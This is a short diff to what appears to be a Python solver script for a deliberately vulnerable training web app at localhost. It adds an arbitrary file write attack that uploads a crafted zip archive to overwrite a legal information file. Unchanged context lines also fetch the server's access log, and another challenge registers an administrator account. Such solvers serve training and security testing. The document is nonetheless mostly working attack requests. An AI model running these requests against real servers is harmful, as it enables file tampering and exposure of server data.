@@ -3,6 +3,8 @@ url='http://localhost:3000' # Indicate the URL without '/' at the end
 import requests
 
 # ==== No required action ====
+# ---- Arbitrary File Write (Overwrite the Legal Information file.)
+requests.post(url+'/file-upload', files={'file':open('file-upload/Arbitrary File Write.zip','rb')})
 # ---- Access Log (Gain access to any access log file of the server.)
 requests.get(url+'/support/logs/access.log')
 # ---- Admin Registration (Register as a user with administrator privileges.)
